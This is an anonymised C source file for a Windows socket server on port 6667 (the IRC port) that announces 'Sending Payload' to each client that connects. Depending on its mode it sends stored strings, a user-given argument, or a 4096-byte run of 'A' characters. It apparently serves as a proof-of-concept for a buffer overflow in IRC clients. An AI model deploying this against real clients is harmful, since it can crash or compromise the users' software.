
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct sockaddr {int dummy; } ;
typedef int WSADATA ;
struct TYPE_3__ {int s_addr; } ;
struct TYPE_4__ {TYPE_1__ sin_addr; int sin_family; int sin_port; } ;
typedef int SOCKET ;
typedef TYPE_2__ SOCKADDR_IN ;
typedef int LPSOCKADDR ;


 int VAR_0 ;
 int VAR_1 ;
 scalar_t__ VAR_2 ;
 int VAR_3 ;
 int FUNC_0 (int,int) ;
 char* VAR_4 ;
 int VAR_5 ;
 char* VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int FUNC_1 () ;
 scalar_t__ FUNC_2 (int ,int *) ;
 int FUNC_3 (scalar_t__,int *,int *) ;
 int FUNC_4 (scalar_t__,int ,int) ;
 int FUNC_5 (int) ;
 int FUNC_6 (scalar_t__,int) ;
 int FUNC_7 (char*,char,int) ;
 int FUNC_8 (char*) ;
 scalar_t__ VAR_9 ;
 int FUNC_9 (int,char*,int,int ) ;
 int FUNC_10 (int) ;
 scalar_t__ FUNC_11 (int ,int ,int ) ;
 scalar_t__ FUNC_12 (char*,char*) ;
 int FUNC_13 (char*) ;
 int FUNC_14 () ;

int FUNC_15(int VAR_10, char *VAR_11[]) {
   SOCKET VAR_12 = VAR_7;
   WSADATA VAR_13;
   SOCKADDR_IN VAR_14;
   int VAR_15;
   char VAR_16[4096];
   if (VAR_10 < 2) {
      FUNC_14();
      return 1;
   }
   if ((!FUNC_12(VAR_11[1],"raw")) && (VAR_10 < 3) || (FUNC_12(VAR_11[1],"raw")) &&
(FUNC_12(VAR_11[1],"part")) && (FUNC_12(VAR_11[1],"data"))) {
      FUNC_14();
      return 1;
   }

   FUNC_8("Listening on port 6667 for connections....\n");
   if (FUNC_2(FUNC_0(1, 1), &VAR_13) != 0) {
           FUNC_8("ERROR: WSA Initialization failed.");
      return 0;
   }



   VAR_9 = FUNC_11(VAR_5, VAR_8, VAR_3);
   if (VAR_9 == VAR_2) {
      FUNC_8("ERROR: Could Not Create Socket. Exiting\n");
      FUNC_1();
      return 0;
   }

   VAR_14.sin_port = FUNC_5(6667);
   VAR_14.sin_family = VAR_0;
   VAR_14.sin_addr.s_addr = VAR_1;


        VAR_15 = FUNC_4(VAR_9, (LPSOCKADDR)&VAR_14, sizeof(struct sockaddr));
   if (VAR_15 == VAR_7) {
      FUNC_8("ERROR Binding Socket");
      FUNC_1();
      return 0;
   }


   if (FUNC_6(VAR_9, 10) == VAR_7) {
      FUNC_8("ERROR: Couldnt Make Listening Socket\n");
      FUNC_1();
      return 0;
   }

   while (VAR_12 == VAR_7) {
         VAR_12 = FUNC_3(VAR_9, ((void*)0), ((void*)0));
   }

   FUNC_8("Client Connected, Sending Payload\n");


   if (!FUNC_12(VAR_11[1],"part")) {
      FUNC_9(VAR_12,VAR_4,FUNC_13(VAR_4),0);
   }
   if (!FUNC_12(VAR_11[1],"raw")) {
      FUNC_9(VAR_12,VAR_6,FUNC_13(VAR_6),0);
      FUNC_9(VAR_12,VAR_11[2],FUNC_13(VAR_11[2]),0);
      FUNC_9(VAR_12,"\n",1,0);
   }
   if (!FUNC_12(VAR_11[1],"data")) {
      FUNC_7(VAR_16,'A',4096);
      FUNC_9(VAR_12,VAR_16,FUNC_13(VAR_16),0);
   }
   FUNC_8("Exiting\n");
   FUNC_10(100);
   FUNC_1();
   return 0;
}
